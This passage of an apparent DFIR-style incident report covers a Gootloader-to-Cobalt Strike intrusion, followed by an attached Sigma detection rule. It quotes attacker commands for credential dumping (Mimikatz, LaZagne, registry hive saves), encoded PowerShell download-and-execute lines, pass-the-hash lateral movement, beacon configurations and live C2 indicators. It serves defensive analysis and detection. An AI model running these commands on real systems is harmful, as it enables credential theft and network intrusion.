Mimikatz\nDescription: The image displays a terminal output related to the Mimikatz tool, specifically its logon passwords command invocation. It reveals detailed authentication information such as the Authentication ID, User Name, Domain, Logon Server, and various Security Identifiers (SIDs). The output also shows encrypted passwords and associated data for different user sessions, which are vital for cybersecurity analysis and understanding credential access methods used by attackers.\nTranscription: |\n  \"CommandInvocation(Out-Default): \"Out-Default\"\n  ParameterBinding(Out-Default): name=\"InputObject\", value=\"\n    .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11\n   .## ^ ##.  \"A La Vie, A L'Amour\"  (oe.eo)\n   ## / \\ ##  /*** Benjamin DELPY 'gentilkiwi' ( benjamin@gentilkiwi.com )\n   ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n   '## v ##'  /*** Vincent LE TOUX             ( vincent.letoux@gmail.com )\n    '#####'       > https://pingcastle.com / https://mysmartlogon.com ***\n  \n  mimikatz(powershell) # sekurlsa::logonpasswords\n  \n  Authentication Id : 0 ; 58533736 (00000000:037d2600)\n  Session           : Interactive from 4\n  User Name         : DWM-4\n  Domain            : Window Manager\n  Logon Server      : (null)\n  Logon Time        : \n  SID               : S-1-5-90-0-4\n  \n          msv :\n           [00000003] Primary\n           * Username : \n           * Domain   : \n           * NTLM     : eb40793              f7177c39\n           * SHA1     : 348211b              5c344070060a76d3\n          tspkg :\n          wdigest :\n           * Username : \n           * Domain   : \n           * Password : (null)\n          kerberos :\n           * Username :                      $\n           * Domain   : .local\n           * Password : &7y`HDCPk_IwQw&^poDZ3aZ,                 -3#Cri2)&s-!&3fi:JT+qg$8^hH6lv4W;\n          ssp :\n          credman :\n          cloudap :\n  \n  Authentication Id : 0 ; 58526506 (00000000:037db02a)\n  Session           : Interactive from 4\n  User Name         : UMFD-4\n  Domain            : Font Driver Host\n  Logon Server      : (null)\n  Logon Time        : 1/31/2022 4:32:26 PM\n  SID               : S-1-5-96-0-4\n  \n          msv :\n           [00000003] Primary\n           * Username :\n```\n\nIn addition, the post-exploitation tool “LaZagne” (renamed to ls.exe) was used with the “-all” switch.\n\n```\nls.exe all -oN -output C:\\Users\\REDACTED\n```\n\nThis will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the “C:\\Users” directory. When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.\n\n```image\nAlt: LaZagne\nDescription: The image displays a table with command line entries related to security processes. It includes commands executed via cmd.exe that save registry hives (security, sam, and system) to specific temporary directory locations on a Windows system. Each command line entry is shown along with its parent command line, indicating the context of execution, which is relevant for analyzing cyber threats and understanding credential access activities.\nTranscription: |\n  CommandLine                                                                                 ParentCommandLine\n  cmd.exe /c \"reg.exe save hklm\\security c:\\windows\\temp\\xoeofpxxon\"                          ls.exe all -oN -output C:\\Users\n  cmd.exe /c \"reg.exe save hklm\\sam c:\\windows\\temp\\nibkqjzy\"                                 ls.exe all -oN -output C:\\Users\n  cmd.exe /c \"reg.exe save hklm\\system c:\\windows\\temp\\nfwlgripmy\"                           ls.exe all -oN -output C:\\Users\n```\n\nHere’s the commands from another system:\n\n```\ncmd.exe /c \"reg.exe save hklm\\sam c:\\users\\REDACTED\\appdata\\local\\temp\\1\\dznuxujzr\"\ncmd.exe /c \"reg.exe save hklm\\system c:\\users\\REDACTED\\appdata\\local\\temp\\1\\mkffdg\"\ncmd.exe /c \"reg.exe save hklm\\security c:\\users\\REDACTED\\appdata\\local\\temp\\1\\iszmqwmjemt\"\n```\n\n## Discovery\n\nThe threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was used to invoke the PowerShell script.\n\n```\npowershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADAAMAA0ADkALwAnACkAOwAgAEkAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZAAgAC0AQwBvAGwAbABlAGMAdABpAG8AbgBNAGUAdABoAG8AZAAgAEEAbABsAA==\n```\n\n```image\nAlt: SharpHound\nDescription: The image shows a web interface for decoding Base64 encoded text. On the left side, there is an input area labeled 'Input' where the Base64 encoded string is displayed. Below it, there is a section titled 'Output' which shows the decoded result. The output reveals a PowerShell command that uses 'Invoke-BloodHound' to collect Active Directory data from a specified IP address. The interface includes options for adjusting the decoding parameters, such as the encoding type.\nTranscription: |\n  Recipe\n  \n  From Base64\n  Alphabet\n  A-Za-z0-9+/=\n  \n  [ ] Remove non-alphabet chars\n  \n  Decode text\n  Encoding\n  UTF-16LE (1200)\n  \n  Input\n  SQBFAFgAIABoAE4AZQB3AG8AbAAtTwBiAGoAZQBjAHQAIABOAGUAdwBCAHgALgBGAE8AdwBuAGQAbwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA\n  nAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMQAwADoANQAwADQAMgAnACkAIABJAG4AdgBvAGsAZQAtAEIAbABvAG8AZABoAG8AdQBuAGQAI\n  AAtAEMAbwBsAGwAZQBjAHQAaQBvAG4ATQBlAHQAcgBvAGQAIABBAGwAbAA=\n  \n  Output\n  IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:10040/'); Invoke-BloodHound -CollectionMethod All\n```\n\nThey also ran a WMI command on the beachhead host and one other host to check for AntiVirus.\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n```\n\nThe threat actors executed this command remotely on a domain controller, before moving laterally to it:\n\n```\npowershell.exe ls C:\\ > C:\\file.txt\n```\n\nWhile having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.\n\nOn the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:\n\n```\n21,80,135,443,445,3389,8080,56133,58000,58157,58294,58682,60234,60461,64502\n```\n\n```image\nAlt: Advanced IP Scanner\nDescription: The image displays a structured log table containing security event data related to the execution of the Advanced IP Scanner tool. It includes columns such as EventCode, TaskCategory, TargetFilename, ParentImage, and CommandLine. The log entries provide details about file creation and process initiation associated with the Advanced IP Scanner executable, indicating how the tool was run and its parent processes. This log is relevant for tracking malicious activity and understanding lateral movement within a network.\nTranscription: |\n  plaintext\n  EventCode  TaskCategory                          TargetFilename                                                         ParentImage                                    CommandLine\n  11         File created                          C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe                         C:\\Windows\\explorer.exe                        \"C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe\"\n             (rule: FileCreate)\n  \n  1          Process Create                        C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe                         C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\n             (rule: ProcessCreate)                                                                                       \"C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\" /SL5=\"$7025C,19765324,139776,C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe\"\n  \n  1          Process Create                        C:\\Users\\████\\AppData\\Local\\Temp\\1\\Advanced IP Scanner                C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\n             (rule: ProcessCreate)                                                                                       \"C:\\Users\\████\\AppData\\Local\\Temp\\1\\Advanced IP Scanner 2\\advanced_ip_scanner.exe\" /portable \"C:\\Users\\████\\\" /lng en_us\n```\n\n## Lateral Movement\n\n```image\nAlt: Lateral Movement\nDescription: The image presents a flowchart titled 'Lateral Movement' that visually maps out the techniques used for lateral movement in a cybersecurity context. It details methods such as using Cobalt Strike, Remote Desktop Protocol (RDP), Windows Management Instrumentation (WMI), and PSExec. Each method is outlined with specific actions, including copying and executing Cobalt Strike, RDP usage through a Cobalt Strike proxy, executing commands via WMI, and commands executed to enable 'Restricted Admin Mode'. The layout is structured to provide a clear understanding of the relationships and processes involved in lateral movement during cyber intrusions.\nTranscription: |\n  Lateral Movement\n  \n  Cobalt Strike\n    \\\\COMPUTER\\ADMIN$\\2c075ae.exe\n    Cobalt Strike Copied to ADMIN$ and Executed via Service\n  \n  Remote Desktop Protocol\n    Remote Desktop via Cobalt Strike Proxy\n    RDP into Servers through a Cobalt Strike Beacon proxy from the beachhead\n  \n  WMI\n    Execute Commands on Remote Hosts via WMI\n    Commands Executed to Enable Restricted Admin Mode\n  \n  PSExec\n    Execute Commands on Remote Hosts via PSExec\n    Commands Executed to Enable Restricted Admin Mode\n```\n\nAs observed in many of our intrusions, the threat actor created and installed Windows services to deploy Cobalt Strike beacons. This method was used to pivot to other systems within the network.\n\n```image\nAlt: Windows Services\nDescription: The image is a screenshot of a Windows Event Log, specifically showing details for Event ID 7045, which indicates that a service has been installed in the system. The log includes fields such as LogName, EventCode, ComputerName, Service File Name, Service Type, Start Type, and Service Account. The Service File Name contains a PowerShell command that has been obfuscated, hinting at malicious activity. This log entry is relevant for understanding the deployment of potentially harmful services in a cybersecurity context.\nTranscription: |\n  LogName=System\n  EventCode=7045\n  EventType=4\n  ComputerName=XXXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-21-805815327-460989457-326783143-1113\n  SidType=0\n  SourceName=Microsoft-Windows-Service Control Manager\n  Type=Information\n  RecordNumber=1663\n  Keywords=Classic\n  TaskCategory=None\n  OpCode=The operation completed successfully.\n  Message=A service was installed in the system.\n  \n  Service Name:  a17bf34\n  Service File Name:  %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADAAtgB1AHcALQBPGAt1AGwAdAAgAEkATwAuAE0AZQBpAGUAaQB1AGYQBtACgB5AFMAwBuAHYAZQB0AG0AOAArBgAGAABgACgAEAwB1ADYANABTAHQAcQBpAG4AZGwA...\n```\n\nSMB was also used to transfer executable Cobalt Strike beacons to various workstations in the environment.\n\n```image\nAlt: SMB Transfer\nDescription: The image is a tabular data representation showing network traffic details related to executable files involved in a cyber intrusion. It includes columns for source IP, source port, destination IP, destination port, number of packets, total data transmitted in bytes, and associated filenames (e.g., 6bb6ca2.exe, a4a375e.exe, 2c075ae.exe). The data appears to provide insights into the communication patterns and file transfers between systems during the lateral movement phase of an attack.\nTranscription: |\n  | Src IP / Country | Src Port | Dst IP / Country | Dst Port | Packets | Databytes / Bytes | Info                   |\n  | ---------------- | -------- | ---------------- | -------- | ------- | ----------------- | ---------------------- |\n  | 10.              | 57943    | 10.              | 445      | 874     | 827,446           | Filename > 6bbc6a2.exe |\n  |                  |          |                  |          |         | 874,666           |                        |\n  | 10.              | 61386    | 10.              | 445      | 892     | 829,032           | Filename > a4a375e.exe |\n  |                  |          |                  |          |         | 877,224           |                        |\n  | 10.              | 61745    | 10.              | 445      | 1,023   | 843,404           | Filename > 2c075ae.exe |\n  |                  |          |                  |          |         | 898,670           |                        |\n```\n\nThese executables were then executed by a remote service visible in the windows event id 7045 logs.\n\n```image\nAlt: Event Logs\nDescription: The image depicts a log entry that details the installation of a Windows service. It includes specific information such as the service name ('6bb6ca2'), service file name ('\\ADMINb6ca2.exe'), service type (user mode service), service start type (demand start), and service account (LocalSystem). This information is pertinent for analyzing potential malicious activity within a network, particularly related to the deployment of malware or unauthorized services.\nTranscription: |\n  \"A service was installed in the system.\n  \n  Service Name: 6bb6ca2\n  Service File Name: \\\\               \\ADMIN$\\6bb6ca2.exe\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\"\n```\n\nNext to deploying Cobalt Strike beacons, the threat actor also used RDP to establish interactive sessions with various hosts on the network. One important aspect of these sessions is that the threat actor authenticated using “Restricted Admin Mode”.\n\nRestricted Admin Mode can be considered a double-edged sword; although it prevents credential theft, it also enables an attacker to perform a pass-the-hash attack using RDP. In other words, after enabling Restricted Admin Mode, just the NTLM hash of the remote desktop user is required to establish a valid RDP session, without the need of possessing the clear password.\n\nThe threat actor attempted to use both Invoke-WMIExec and psexec to enable “Restricted Admin Mode”.\n\n```\npsexec \\\\<redacted> -u <redacted>\\<redacted> -p <redacted> reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n```\n\n```\npowershell -nop -noni -ep bypass -w h -c \"$u=('http://127.0.0.1:47961/'|%%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module C:\\Users\\<redacted>\\Invoke-WMIExec.ps1; Invoke-WMIExec -Target <redacted> -Domain <redacted> -Username <redacted> -Hash <redacted> -Command \"powershell.exe New-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Lsa' -Name 'DisableRestrictedAdmin' -Value 0 -PropertyType DWORD\" -verbose\"\n```\n\nThe logon information of EventID 4624 includes a field “Restricted Admin Mode”, which is set to the value “Yes” if the feature is used.\n\n```image\nAlt: Restricted Admin Mode\nDescription: The image displays a Windows Event Log entry for Event ID 4624, indicating a successful logon event. It contains detailed information such as the Logon Type, Security ID, Account Name, and notable mention of 'Restricted Admin Mode' being set to 'Yes'. This log entry is significant for tracking authentication methods used by threat actors and understanding their techniques, particularly in the context of lateral movement within a network.\nTranscription: |\n  LogName=Security\n  EventCode=4624\n  EventType=0\n  ComputerName=████████\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=31774\n  Keywords=Audit Success\n  TaskCategory=Logon\n  OpCode=Info\n  Message=An account was successfully logged on.\n  \n  Subject:\n      Security ID:        S-1-5-18\n      Account Name:       ████████\n      Account Domain:     ████████\n      Logon ID:           0x3E7\n  \n  Logon Information:\n      Logon Type:         10\n      Restricted Admin Mode:    Yes\n      Virtual Account:    No\n      Elevated Token:     Yes\n  \n  Impersonation Level:    Impersonation\n  \n  New Logon:\n      Security ID:        ████████\n      Account Name:       ████████\n      Account Domain:     ████████\n      Logon ID:           0x3798A24\n      Linked Logon ID:    0x0\n      Network Account Name:    -\n      Network Account Domain:  -\n      Logon GUID:         {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n      Process ID:         0x3fc\n      Process Name:       C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n      Workstation Name:   -\n      Source Network Address:  ████████\n      Source Port:        0\n  \n  Detailed Authentication Information:\n      Logon Process:      User32\n      Authentication Package:   Negotiate\n      Transited Services:   -\n      Package Name (NTLM only): -\n      Key Length:         0\n```\n\n## Collection\n\nThe threat actor accessed multiple files during the RDP sessions on multiple servers. In one instance document files were opened directly on the system.\n\n```image\nAlt: Document Access\nDescription: The image is a table displaying details of processes created during a cyber incident. It contains three columns: 'Action Type,' 'Initiating Process Command Line,' and 'Process Command Line.' The 'Action Type' indicates that 'ProcessCreated' occurred twice, both initiated by 'Explorer.EXE.' The 'Process Command Line' details that 'WORDPAD.EXE' was used to open two document files located in a specified directory, with the file paths partially redacted.\nTranscription: |\n  Action Type       Initiating Process Command Line   Process Command Line\n  ProcessCreated    Explorer.EXE                      \"WORDPAD.EXE\" \"C:\\████\\Contracts\\████████.docx\"\n  ProcessCreated    Explorer.EXE                      \"WORDPAD.EXE\" \"C:\\████\\Contracts\\████████.docx\"\n```\n\nShellbags revealed attempts to enumerate multiple file shares containing information of interest to the threat actor.\n\n```image\nAlt: File Shares\nDescription: The image depicts a screenshot of a file directory structure, showing folders labeled 'IT,' 'Passwords,' and 'Contracts' under the 'Computers and Devices' section on a desktop interface. The screenshot includes icons representing directories and appears to display information related to file enumeration, which is relevant to the context of the threat actor's activities in accessing files during RDP sessions.\nTranscription: |\n  Value\n  Desktop\n    Computers and Devices\n      [Redacted]\n        IT\n          Passwords\n        Contracts\n        [Redacted]\n  \n  Drag a column header here to group by that column\n  \n  Value      Icon        Shell Type\n  [Redacted] No image    [Redacted]\n  Contracts  Directory   Directory\n  IT         Directory   Directory\n```\n\n## Command and Control\n\n### Gootloader\n\nGootloader second stage download URLs. These URLs were deobfuscated and extracted using this script by HP Threat Research. They’ve updated this script at least a few times now, thanks @hpsecurity and thanks to @GootLoaderSites for sharing on twitter as its broken/fixed.\n\n```\nhxxps://kakiosk.adsparkdev[.]com/test.php?hjkiofilihyl=\nhxxps://jp.imonitorsoft[.]com/test.php?hjkiofilihyl=\nhxxps://junk-bros[.]com/test.php?hjkiofilihyl=\n```\n\nDuring the intrusion, the Gootloader loader was observed communicating to 35.206.117.64:443 kakiosk[.]adsparkdev[.]com.\n\n```\nJa3:a0e9f5d64349fb13191bc781f81f42e1\nJa3s:567bb420d39046dbfd1f68b558d86382\nCertificate: [d8:85:d1:48:a2:99:f5:ee:9d:a4:3e:01:1c:b0:ec:12:e5:23:7d:61 ]\nNot Before: 2022/01/05 09:25:33 UTC\nNot After: 2022/04/05 09:25:32 UTC\nIssuer Org: Let's Encrypt\nSubject Common: kakiosk.adsparkdev.com [kakiosk.adsparkdev.com ,www.kakiosk.adsparkdev.com ]\nPublic Algorithm: rsaEncryption\n```\n\n### Cobalt Strike\n\n**146.70.78.43**\n\nCobalt Strike server TLS configuration:\n\n```\n146.70.78.43\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After: May 17 18:26:24 2025 GMT\nIssuer:  C=, ST=, L=, O=, OU=, CN=\nSubject:  C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike beacon configuration:\n\n```\nCobalt Strike Beacon:\n  x86:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 146.70.78.43,/visit.js\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; yie9)\n    uses_cookies: 1\n    watermark: 1580103824\n  x64:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 146.70.78.43,/fwlink\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;ENXA)\n    uses_cookies: 1\n    watermark: 1580103824\n```\n\n**37.120.198.225**\n\nCobalt Strike server TLS configuration:\n\n```\nJa3:72a589da586844d7f0818ce684948eea\nJa3s:f176ba63b4d68e576b5ba345bec2c7b7\nSerial Number: 146473198 (0x8bb00ee)\nCertificate: 73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F\nNot Before: May 20 18:26:24 2015 GMT\nNot After : May 17 18:26:24 2025 GMT\nIssuer: C=, ST=, L=, O=, OU=, CN=\nSubject: C=, ST=, L=, O=, OU=, CN=\nPublic Algorithm: rsaEncryption\n```\n\nCobalt Strike beacon configuration:\n\n```\nCobalt Strike Beacon:\n  x86:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 37.120.198.225,/cm\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n    uses_cookies: 1\n    watermark: 1580103824\n  x64:\n    beacon_type: HTTPS\n    dns-beacon.strategy_fail_seconds: -1\n    dns-beacon.strategy_fail_x: -1\n    dns-beacon.strategy_rotate_seconds: -1\n    http-get.client:\n      Cookie\n    http-get.uri: 37.120.198.225,/ptj\n    http-get.verb: GET\n    http-post.client:\n      Content-Type: application/octet-stream\n      id\n    http-post.uri: /submit.php\n    http-post.verb: POST\n    maxgetsize: 1048576\n    port: 443\n    post-ex.spawnto_x64: %windir%\\sysnative\\rundll32.exe\n    post-ex.spawnto_x86: %windir%\\syswow64\\rundll32.exe\n    process-inject.execute:\n      CreateThread\n      SetThreadContext\n      CreateRemoteThread\n      RtlCreateUserThread\n    process-inject.startrwx: 64\n    process-inject.stub: 222b8f27dbdfba8ddd559eeca27ea648\n    process-inject.userwx: 64\n    proxy.behavior: 2 (Use IE settings)\n    server.publickey_md5: defb5d95ce99e1ebbf421a1a38d9cb64\n    sleeptime: 60000\n    useragent_header: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts; IE0006_ver1;EN_GB)\n    uses_cookies: 1\n    watermark: 1580103824\n```\n\nReal Intelligence Threat Analytics (RITA) was successful in locating one of the IP addresses used for Cobalt Strike command and control communications.\n\n```image\nAlt: RITA\nDescription: The image displays a data table generated by RITA (Real Intelligence Threat Analytics) showing network traffic statistics related to Cobalt Strike beacons. It includes columns for score, source IP, destination IP, number of connections, average bytes transferred, interval ranges, size ranges, and their respective modes and counts. The data provides insights into communication patterns with a specific Cobalt Strike server (146.70.78.43), indicating a total of 20,902 connections and an average of 3,883 bytes per connection. This information is critical for analyzing potential command and control activity.\nTranscription: |\n  plaintext\n  Time Generated: Sat, 02 Apr 2022 19:51:10 EDT\n  \n  Score   Source        Destination   Connections   Avg. Bytes   Intvl. Range   Size Range   Intvl. Mode   Size Mode   Intvl. Mode Count   Size Mode Count   Intvl. Skew   Size Skew   Intvl. Dispersion   Size Dispersion   Total Bytes\n  0.995   10.43.61.202  146.70.78.43  20902         3883.000     13780          2567         1             2181        14945               14285             0.000         0.000      0                   0                81180557\n```\n\nNetscan data extracted via Volatility from the beachhead host showing Cobalt Strike C2 connections:\n\n```\nVolatility 3 Framework 2.0.0\n\nOffset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created\n...\n0x948431c46010  TCPv4   10.X.X.X    52670   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe   \n0x948431e19010  TCPv4   10.X.X.X   63723   146.70.78.43    443     CLOSED  3420    rundll32.exe    \n0x9484337f18a0  TCPv4   10.X.X.X    52697   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe    \n0x948435102050  TCPv4   10.X.X.X    52689   146.70.78.43    443     CLOSE_WAIT      3420    rundll32.exe \n...\n```\n\n## Impact\n\nIn this case, there was no further impact to the environment before the threat actors were evicted.\n\n## Indicators\n\n### Network\n\n**Gootloader** \nhttps://kakiosk.adsparkdev[.]com \nhttps://jp.imonitorsoft[.]com \nhttps://junk-bros[.]com \n35.206.117.64:443\n\n**Cobalt Strike** \n146.70.78.43:443 \n37.120.198.225:443\n\n### File\n\n```\nolympus_plea_agreement 34603 .js\nd7d3e1c76d5e2fa9f7253c8ababd6349\n724013ea6906a3122698fd125f55546eac0c1fe0\n6e141779a4695a637682d64f7bc09973bb82cd24211b2020c8c1648cdb41001b\n\nolympus plea agreement(46196).zip\nb50333ff4e5cbcda8b88ce109e882eeb\n44589fc2a4d1379bee93282bbdb16acbaf762a45\n7d93b3531f5ab7ef8d68fb3d06f57e889143654de4ba661e5975dae9679bbb2c\n\nmi.ps1\nacef25c1f6a7da349e62b365c05ae60c\nc5d134a96ca4d33e96fb0ab68cf3139a95cf8071\nd00edf5b9a9a23d3f891afd51260b3356214655a73e1a361701cda161798ea0b\n\nInvoke-WMIExec.ps1\nb4626a335789e457ea48e56dfbf39710\n62a7656d81789591358796100390799e83428519\nc4939f6ad41d4f83b427db797aaca106b865b6356b1db3b7c63b995085457222\n\nls.exe\n87ae2a50ba94f45da39ec7673d71547c\ndfa0b4206abede8f441fcdc8155803b8967e035c\n8764131983eac23033c460833de5e439a4c475ad94cfd561d80cb62f86ff50a4\n```\n\n## Detections\n\n### Network\n\n```\nET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike\nET MALWARE Meterpreter or Other Reverse Shell SSL Cert\n```\n\n### Sigma\n\nCustom Sigma rules:\n\n- Deleting Windows Defender scheduled tasks\n- Enabling restricted admin mode\n\nSigma repo rules:\n\n- Bloodhound Detection\n- Powershell download\n- Defender Disable via Powershell\n- Creation of Scheduled Task via Powershell\n- LaZagne LSASS Access\n- Systeminfo Discovery\n- CobaltStrike Named Pipe\n- Malicious PowerShell Commandlets\n- Suspicious Service Installation\n- Suspicious XOR Encoded PowerShell Command Line\n- Too Long PowerShell Commandlines\n- PowerShell Network Connections\n- Rundll32 Internet Connection\n- Mimikatz Use\n\n### Yara\n\nCustom Yara rule\n\n## MITRE\n\n- **T1189** Drive-by Compromise\n- **T1204.001** – User Execution: Malicious Link\n- **T1204.002** – User Execution: Malicious File\n- **T1059.001** – Command and Scripting Interpreter: PowerShell\n- **T1053** – Scheduled Task/Job\n- **T1218.011** – System Binary Proxy Execution: Rundll32\n- **T1555** – Credentials from Password Stores\n- **T1003.001** – OS Credential Dumping: LSASS Memory\n- **T1087** – Account Discovery\n- **T1560** – Archive Collected Data\n- **T1482** – Domain Trust Discovery\n- **T1615** – Group Policy Discovery\n- **T1069** – Permission Groups Discovery\n- **T1018** – Remote System Discovery\n- **T1033** – System Owner/User Discovery\n- **T1021.001** – Remote Services: Remote Desktop Protocol\n- **T1021.006** – Remote Services: Windows Remote Management\n- **T1005** – Data from Local System\n- **T1039** – Data from Network Shared Drive\n- **T1046** – Network Service Scanning\n- **T1562.001** – Impair Defenses: Disable or Modify Tools\n- **T1518.001** – Security Software Discovery\n- **T1071.001** Web Protocols\n- **T1027** – Obfuscated Files or Information",
    "sigma_rule": {
      "title": "Suspicious Encoded And Obfuscated Reflection Assembly Load Function Call",
      "id": "9c0295ce-d60d-40bd-bd74-84673b7592b1",
      "related": [
        {
          "id": "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious base64 encoded and obfuscated \"LOAD\" keyword used in .NET \"reflection.assembly\"",
      "references": [
        "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
        "https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=net-7.0"
      ],
      "author": "pH-T (Nextron Systems)",
      "date": "2022-03-01",
      "modified": "2023-04-06",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1059.001",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ",
            "oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA",
            "6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA",
            "OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ",
            "oAOgAoACIATABvACIAKwAiAGEAZAAiACkA",
            "6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA",
            "OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ",
            "oAOgAoACIATABvAGEAIgArACIAZAAiACkA",
            "6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA",
            "OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ",
            "oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA",
